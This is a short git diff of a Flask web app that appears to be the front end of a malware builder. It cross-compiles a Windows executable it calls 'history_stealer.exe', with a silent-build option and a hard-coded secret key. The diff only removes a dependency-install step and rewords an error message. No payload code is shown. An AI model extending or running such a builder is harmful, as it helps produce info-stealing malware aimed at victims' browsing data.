@@ -2,7 +2,7 @@ from flask import Flask, render_template, request, send_from_directory, flash, r
 import os
 import zipfile
 import shutil
-from builder import check_mingw, install_dependencies, generate_config_h, compile_program
+from builder import check_mingw, generate_config_h, compile_program
 
 app = Flask(__name__)
 app.secret_key = "supersecretkey"
@@ -52,10 +52,9 @@ def builder():
 
         try:
             if not check_mingw():
-                flash("MinGW-w64 not found. Please install it (e.g., 'sudo apt install mingw-w64').", "error")
+                flash("MinGW-w64 not found. Please ensure it is installed.", "error")
                 return redirect(url_for("builder"))
 
-            install_dependencies()
             generate_config_h(config)
             compile_program(silent == "1")
             flash("Build successful! Executable created: history_stealer/history_stealer.exe", "success")
